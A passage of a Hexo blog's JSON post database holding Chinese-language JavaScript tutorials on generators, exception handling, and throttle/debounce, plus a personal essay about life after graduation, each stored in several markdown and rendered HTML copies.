class=\"keyword\">yield</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>yield*</code>是委派至另一个生成器函数</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">anotherGenerator</span>(<span class=\"params\">i</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> i + <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> i + <span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> i + <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">generator</span>(<span class=\"params\">i</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> i;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span>* anotherGenerator(i);</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> i + <span class=\"number\">10</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> gen = generator(<span class=\"number\">10</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(gen.next().value); <span class=\"comment\">// 10</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(gen.next().value); <span class=\"comment\">// 11</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(gen.next().value); <span class=\"comment\">// 12</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(gen.next().value); <span class=\"comment\">// 13</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(gen.next().value); <span class=\"comment\">// 20</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"generator-函数的使用\"><a href=\"#generator-函数的使用\" class=\"headerlink\" title=\"generator 函数的使用\"></a>generator 函数的使用</h5><ul>\n<li><code>ticketGenerate()</code>不会马上执行它的主体，而是会返回一个这个生成器函数的迭代器对象</li>\n<li>当这个迭代器对象的 next 方法被调用时候，生成器函数的主体会执行到第一个 yield 表达式，该表达式定义了迭代器对象返回的值。</li>\n<li>next()返回一个对象：{value:1,done:false}，value 属性是产出的值，done 属性是表示生成器是否已经产出了它最后的值。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ticket = ticketGenerate(); <span class=\"comment\">//返回一个生成器对象</span></span><br><span class=\"line\">ticket.next(); <span class=\"comment\">//&#123;value: 1, done: false&#125;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"影响-generator-的状态\"><a href=\"#影响-generator-的状态\" class=\"headerlink\" title=\"影响 generator 的状态\"></a>影响 generator 的状态</h5><ul>\n<li>next()的另一个妙用是可以给它传递值，它会被视为 generator 中的 yield 语句的结果对待。</li>\n<li>因此 next 是在 generator 运行过程中向其传递信息的方式。我们可以借此来重置取号机，将号码变为 0。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">ticketGenerator</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; <span class=\"literal\">true</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> reset = <span class=\"keyword\">yield</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (reset) &#123;</span><br><span class=\"line\">      i = <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> takeANumber = ticketGenerator();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(takeANumber.next().value); <span class=\"comment\">//0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(takeANumber.next().value); <span class=\"comment\">//1</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(takeANumber.next().value); <span class=\"comment\">//2</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(takeANumber.next(<span class=\"literal\">true</span>).value); <span class=\"comment\">//0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(takeANumber.next().value); <span class=\"comment\">//1</span></span><br></pre></td></tr></table></figure>\n"},{"title":"js里的异常","date":"2017-05-18T07:59:06.000Z","comments":0,"_content":"\n### throw\n\n> 用来抛出一个异常，throw expression\n\n* throw 12 //抛出数值 12 的异常\n* throw 'err' //抛出字符串'err'的异常\n* throw {name:'异常的名字',message:'异常的信息',stack:'一般还有个函数栈'} //抛出对象的异常，一般这个对象包含名字，信息，栈。可以试一下 throw new Error('123')\n\n也可以创建自定义错误\n\n```javascript\nfunction UserException(message) {\n  this.name = \"UserException\";\n  this.message = message;\n}\nthrow new UserException(\"用户消息错误\");\n```\n\n### try..catch 大法\n\n> 配合 throw 能找出自己程序的异常\n\n```javascript\nfunction printValue(value) {\n  if (value == 1) {\n    throw new Error(\"值是1错误\");\n  } else {\n    console.log(value);\n  }\n}\ntry {\n  printValue(1);\n} catch (e) {\n  console.log(e.message, e.name, e.stack);\n}\n```\n","source":"_posts/use-CatchException.md","raw":"---\ntitle: js里的异常\ndate: 2017-05-18 15:59:06\ntags: javascript\ncomments: false\n---\n\n### throw\n\n> 用来抛出一个异常，throw expression\n\n* throw 12 //抛出数值 12 的异常\n* throw 'err' //抛出字符串'err'的异常\n* throw {name:'异常的名字',message:'异常的信息',stack:'一般还有个函数栈'} //抛出对象的异常，一般这个对象包含名字，信息，栈。可以试一下 throw new Error('123')\n\n也可以创建自定义错误\n\n```javascript\nfunction UserException(message) {\n  this.name = \"UserException\";\n  this.message = message;\n}\nthrow new UserException(\"用户消息错误\");\n```\n\n### try..catch 大法\n\n> 配合 throw 能找出自己程序的异常\n\n```javascript\nfunction printValue(value) {\n  if (value == 1) {\n    throw new Error(\"值是1错误\");\n  } else {\n    console.log(value);\n  }\n}\ntry {\n  printValue(1);\n} catch (e) {\n  console.log(e.message, e.name, e.stack);\n}\n```\n","slug":"use-CatchException","published":1,"updated":"2018-04-11T03:35:16.392Z","layout":"post","photos":[],"link":"","_id":"cjsm034sv004t0iofvnv3263m","content":"<h3 id=\"throw\"><a href=\"#throw\" class=\"headerlink\" title=\"throw\"></a>throw</h3><blockquote>\n<p>用来抛出一个异常，throw expression</p>\n</blockquote>\n<ul>\n<li>throw 12 //抛出数值 12 的异常</li>\n<li>throw ‘err’ //抛出字符串’err’的异常</li>\n<li>throw {name:’异常的名字’,message:’异常的信息’,stack:’一般还有个函数栈’} //抛出对象的异常，一般这个对象包含名字，信息，栈。可以试一下 throw new Error(‘123’)</li>\n</ul>\n<p>也可以创建自定义错误</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">UserException</span>(<span class=\"params\">message</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = <span class=\"string\">\"UserException\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.message = message;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UserException(<span class=\"string\">\"用户消息错误\"</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"try-catch-大法\"><a href=\"#try-catch-大法\" class=\"headerlink\" title=\"try..catch 大法\"></a>try..catch 大法</h3><blockquote>\n<p>配合 throw 能找出自己程序的异常</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">printValue</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (value == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">\"值是1错误\"</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(value);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  printValue(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(e.message, e.name, e.stack);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"throw\"><a href=\"#throw\" class=\"headerlink\" title=\"throw\"></a>throw</h3><blockquote>\n<p>用来抛出一个异常，throw expression</p>\n</blockquote>\n<ul>\n<li>throw 12 //抛出数值 12 的异常</li>\n<li>throw ‘err’ //抛出字符串’err’的异常</li>\n<li>throw {name:’异常的名字’,message:’异常的信息’,stack:’一般还有个函数栈’} //抛出对象的异常，一般这个对象包含名字，信息，栈。可以试一下 throw new Error(‘123’)</li>\n</ul>\n<p>也可以创建自定义错误</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">UserException</span>(<span class=\"params\">message</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = <span class=\"string\">\"UserException\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.message = message;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UserException(<span class=\"string\">\"用户消息错误\"</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"try-catch-大法\"><a href=\"#try-catch-大法\" class=\"headerlink\" title=\"try..catch 大法\"></a>try..catch 大法</h3><blockquote>\n<p>配合 throw 能找出自己程序的异常</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">printValue</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (value == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">\"值是1错误\"</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(value);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  printValue(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(e.message, e.name, e.stack);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"函数节流和防抖","date":"2017-04-10T12:26:06.000Z","_content":"\n## 节流（throttle）\n\n> 函数节流是指一定时间内只跑一次函数，就像是技能 cd，你再怎么按它一段时间内只能触发一次。\n\n* 主要思想就是设置一个守卫（flag），如果 setTimeout 已经执行过了就不会创建新的 setTimeout\n\n```javascript\nlet scrollFun = function(time) {\n  let canRun = true; //初始化守卫变量\n  return function() {\n    if (canRun) {\n      canRun = false;\n      setTimeout(() => {\n        console.log(\"throttle\");\n        //3s后变量才为true，才可以继续执行if条件\n        canRun = true;\n      }, time);\n    }\n  };\n};\n//3s执行一次\nwindow.scroll = scrollFun(3000);\n```\n\n* 适用于窗口 resize\n\n## 防抖(debounce)\n\n> 函数防抖呢，就是频繁触发后，一旦空闲下来才开始执行这个函数。就像公交车司机，如果有人陆续刷卡，司机一直停车等待，直到所有人上来了才回开车。\n\n* 主要思想就是如果频繁触发，就取消上一个，重新创建一个规定时长的 setTimeout\n\n```javascript\nlet debounce = function(time) {\n  let setTimeId = null;\n  return function() {\n    //取消上一个的\n    clearTimeout(setTimeId);\n    setTimeId = setTimeout(() => {\n      console.log(\"debounce\");\n    }, time);\n  };\n};\n//直到没有输入后，3s后才执行\n$(el).input(dubounce(3000));\n```\n\n* 适用于输入框输入持续监听等\n","source":"_posts/throttleAndDebounce.md","raw":"---\ntitle: 函数节流和防抖\ndate: 2017-04-10 20:26:06\ntags: javascript\n---\n\n## 节流（throttle）\n\n> 函数节流是指一定时间内只跑一次函数，就像是技能 cd，你再怎么按它一段时间内只能触发一次。\n\n* 主要思想就是设置一个守卫（flag），如果 setTimeout 已经执行过了就不会创建新的 setTimeout\n\n```javascript\nlet scrollFun = function(time) {\n  let canRun = true; //初始化守卫变量\n  return function() {\n    if (canRun) {\n      canRun = false;\n      setTimeout(() => {\n        console.log(\"throttle\");\n        //3s后变量才为true，才可以继续执行if条件\n        canRun = true;\n      }, time);\n    }\n  };\n};\n//3s执行一次\nwindow.scroll = scrollFun(3000);\n```\n\n* 适用于窗口 resize\n\n## 防抖(debounce)\n\n> 函数防抖呢，就是频繁触发后，一旦空闲下来才开始执行这个函数。就像公交车司机，如果有人陆续刷卡，司机一直停车等待，直到所有人上来了才回开车。\n\n* 主要思想就是如果频繁触发，就取消上一个，重新创建一个规定时长的 setTimeout\n\n```javascript\nlet debounce = function(time) {\n  let setTimeId = null;\n  return function() {\n    //取消上一个的\n    clearTimeout(setTimeId);\n    setTimeId = setTimeout(() => {\n      console.log(\"debounce\");\n    }, time);\n  };\n};\n//直到没有输入后，3s后才执行\n$(el).input(dubounce(3000));\n```\n\n* 适用于输入框输入持续监听等\n","slug":"throttleAndDebounce","published":1,"updated":"2018-04-10T12:54:39.590Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034sw004v0iofp7y7asuh","content":"<h2 id=\"节流（throttle）\"><a href=\"#节流（throttle）\" class=\"headerlink\" title=\"节流（throttle）\"></a>节流（throttle）</h2><blockquote>\n<p>函数节流是指一定时间内只跑一次函数，就像是技能 cd，你再怎么按它一段时间内只能触发一次。</p>\n</blockquote>\n<ul>\n<li>主要思想就是设置一个守卫（flag），如果 setTimeout 已经执行过了就不会创建新的 setTimeout</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> scrollFun = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">time</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> canRun = <span class=\"literal\">true</span>; <span class=\"comment\">//初始化守卫变量</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (canRun) &#123;</span><br><span class=\"line\">      canRun = <span class=\"literal\">false</span>;</span><br><span class=\"line\">      setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">\"throttle\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">//3s后变量才为true，才可以继续执行if条件</span></span><br><span class=\"line\">        canRun = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      &#125;, time);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//3s执行一次</span></span><br><span class=\"line\"><span class=\"built_in\">window</span>.scroll = scrollFun(<span class=\"number\">3000</span>);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>适用于窗口 resize</li>\n</ul>\n<h2 id=\"防抖-debounce\"><a href=\"#防抖-debounce\" class=\"headerlink\" title=\"防抖(debounce)\"></a>防抖(debounce)</h2><blockquote>\n<p>函数防抖呢，就是频繁触发后，一旦空闲下来才开始执行这个函数。就像公交车司机，如果有人陆续刷卡，司机一直停车等待，直到所有人上来了才回开车。</p>\n</blockquote>\n<ul>\n<li>主要思想就是如果频繁触发，就取消上一个，重新创建一个规定时长的 setTimeout</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> debounce = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">time</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> setTimeId = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//取消上一个的</span></span><br><span class=\"line\">    clearTimeout(setTimeId);</span><br><span class=\"line\">    setTimeId = setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">\"debounce\"</span>);</span><br><span class=\"line\">    &#125;, time);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//直到没有输入后，3s后才执行</span></span><br><span class=\"line\">$(el).input(dubounce(<span class=\"number\">3000</span>));</span><br></pre></td></tr></table></figure>\n<ul>\n<li>适用于输入框输入持续监听等</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"节流（throttle）\"><a href=\"#节流（throttle）\" class=\"headerlink\" title=\"节流（throttle）\"></a>节流（throttle）</h2><blockquote>\n<p>函数节流是指一定时间内只跑一次函数，就像是技能 cd，你再怎么按它一段时间内只能触发一次。</p>\n</blockquote>\n<ul>\n<li>主要思想就是设置一个守卫（flag），如果 setTimeout 已经执行过了就不会创建新的 setTimeout</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> scrollFun = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">time</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> canRun = <span class=\"literal\">true</span>; <span class=\"comment\">//初始化守卫变量</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (canRun) &#123;</span><br><span class=\"line\">      canRun = <span class=\"literal\">false</span>;</span><br><span class=\"line\">      setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">\"throttle\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">//3s后变量才为true，才可以继续执行if条件</span></span><br><span class=\"line\">        canRun = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      &#125;, time);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//3s执行一次</span></span><br><span class=\"line\"><span class=\"built_in\">window</span>.scroll = scrollFun(<span class=\"number\">3000</span>);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>适用于窗口 resize</li>\n</ul>\n<h2 id=\"防抖-debounce\"><a href=\"#防抖-debounce\" class=\"headerlink\" title=\"防抖(debounce)\"></a>防抖(debounce)</h2><blockquote>\n<p>函数防抖呢，就是频繁触发后，一旦空闲下来才开始执行这个函数。就像公交车司机，如果有人陆续刷卡，司机一直停车等待，直到所有人上来了才回开车。</p>\n</blockquote>\n<ul>\n<li>主要思想就是如果频繁触发，就取消上一个，重新创建一个规定时长的 setTimeout</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> debounce = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">time</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> setTimeId = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//取消上一个的</span></span><br><span class=\"line\">    clearTimeout(setTimeId);</span><br><span class=\"line\">    setTimeId = setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">\"debounce\"</span>);</span><br><span class=\"line\">    &#125;, time);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//直到没有输入后，3s后才执行</span></span><br><span class=\"line\">$(el).input(dubounce(<span class=\"number\">3000</span>));</span><br></pre></td></tr></table></figure>\n<ul>\n<li>适用于输入框输入持续监听等</li>\n</ul>\n"},{"title":"杂乱无章","date":"2017-09-24T12:35:31.000Z","_content":"\n最近有点忙，忙得几乎都不像是一个才毕业了两个月的人。生活也足够简单，两点一线，下班后最大的愿望便是去书店看（zhuang）书（bi），偷得浮生半日闲。\n\n在九月过半的时候，我突然发觉应有点仪式感——纪念一下曾经是学生的日子，于是总想写些什么。在学校的日子已算是一去不复返了，他们开学的时候，我总是觉得自己失去了些什么，那种感觉无以言状。\n\n出来工作的时候，确实会觉得上学的时光是美好的，这种生活的内核是多彩，不重复。也许这是钱老说的那样，城里的人想出去，城外的人想进来。小时候总是想快些长大，想快点去各种自己喜欢的事情，那些盼呀盼呀总觉得盼不到的日子，现在突然就来临了。那些小时候喜欢的事，反倒是换了一份新鲜感。人呀，越是要自由，就越要担起更多的责任。而我们开始慢慢长大，获得了从前不曾有的自由，不论是经济上还是情感上，但是同时也有了更多的责任。\n\n有时候会觉得这些日子乏味，枯燥，我渐渐地就开始看起了以前那些没看完的书。学会了以宽容的心态去面对生活，可能也是时光宽容了我。有时候，在早晨公交车如此多人的时候，每个人的心情都十分烦躁，鸟儿的声音也是聒噪多余的，但我总是会看到我们这一路司机在特别人多下车的地方，都会大声提醒外面有车开过来，下车注意些。每当看到这些画面，心里就会特别感激，对于生活，感觉才真正有了那种烟火气息。\n\n看到很多人工作之后发的朋友圈，千篇一律的累，单调，全然没有了上学时候的激情。我曾经也迷茫，但是周遭厉害的人都很多，容不得我没有激情。当在这二十几岁的年纪里，还有很多我们不曾到达的领域，褪掉了激情，再无可能去攀登——最近在《人性的弱点》里体会到，也算是满满的鸡汤文，但是与卡耐基对话，就有种想要变得更好的冲动。\n\n不管如何，失败一些，成功一些，本就是一件很好的事。也庆幸在大学里谈过恋爱，懂得了如何去珍惜，分开的时候会对感情这件事极其失望，当然现在是以感恩面对这些，过往不究。有时候夜深了在黄埔大道上面走着，灯影明灭，总是会看见一两对小情侣在打闹，或是依偎，我会觉得特别有生气，也会想起大学时候谈恋爱的时光。现在一个人了，虽无拘束，但心情总有波澜。\n\n思绪很杂，文字也随之杂乱无章。\n","source":"_posts/think.md","raw":"---\ntitle: 杂乱无章\ndate: 2017-09-24 20:35:31\ntags: 生活随想\n---\n\n最近有点忙，忙得几乎都不像是一个才毕业了两个月的人。生活也足够简单，两点一线，下班后最大的愿望便是去书店看（zhuang）书（bi），偷得浮生半日闲。\n\n在九月过半的时候，我突然发觉应有点仪式感——纪念一下曾经是学生的日子，于是总想写些什么。在学校的日子已算是一去不复返了，他们开学的时候，我总是觉得自己失去了些什么，那种感觉无以言状。\n\n出来工作的时候，确实会觉得上学的时光是美好的，这种生活的内核是多彩，不重复。也许这是钱老说的那样，城里的人想出去，城外的人想进来。小时候总是想快些长大，想快点去各种自己喜欢的事情，那些盼呀盼呀总觉得盼不到的日子，现在突然就来临了。那些小时候喜欢的事，反倒是换了一份新鲜感。人呀，越是要自由，就越要担起更多的责任。而我们开始慢慢长大，获得了从前不曾有的自由，不论是经济上还是情感上，但是同时也有了更多的责任。\n\n有时候会觉得这些日子乏味，枯燥，我渐渐地就开始看起了以前那些没看完的书。学会了以宽容的心态去面对生活，可能也是时光宽容了我。有时候，在早晨公交车如此多人的时候，每个人的心情都十分烦躁，鸟儿的声音也是聒噪多余的，但我总是会看到我们这一路司机在特别人多下车的地方，都会大声提醒外面有车开过来，下车注意些。每当看到这些画面，心里就会特别感激，对于生活，感觉才真正有了那种烟火气息。\n\n看到很多人工作之后发的朋友圈，千篇一律的累，单调，全然没有了上学时候的激情。我曾经也迷茫，但是周遭厉害的人都很多，容不得我没有激情。当在这二十几岁的年纪里，还有很多我们不曾到达的领域，褪掉了激情，再无可能去攀登——最近在《人性的弱点》里体会到，也算是满满的鸡汤文，但是与卡耐基对话，就有种想要变得更好的冲动。\n\n不管如何，失败一些，成功一些，本就是一件很好的事。也庆幸在大学里谈过恋爱，懂得了如何去珍惜，分开的时候会对感情这件事极其失望，当然现在是以感恩面对这些，过往不究。有时候夜深了在黄埔大道上面走着，灯影明灭，总是会看见一两对小情侣在打闹，或是依偎，我会觉得特别有生气，也会想起大学时候谈恋爱的时光。现在一个人了，虽无拘束，但心情总有波澜。\n\n思绪很杂，文字也随之杂乱无章。\n","slug":"think","published":1,"updated":"2018-04-10T02:23:59.749Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034sx004x0iofqvefhfhd","content":"<p>最近有点忙，忙得几乎都不像是一个才毕业了两个月的人。生活也足够简单，两点一线，下班后最大的愿望便是去书店看（zhuang）书（bi），偷得浮生半日闲。</p>\n<p>在九月过半的时候，我突然发觉应有点仪式感——纪念一下曾经是学生的日子，于是总想写些什么。在学校的日子已算是一去不复返了，他们开学的时候，我总是觉得自己失去了些什么，那种感觉无以言状。</p>\n<p>出来工作的时候，确实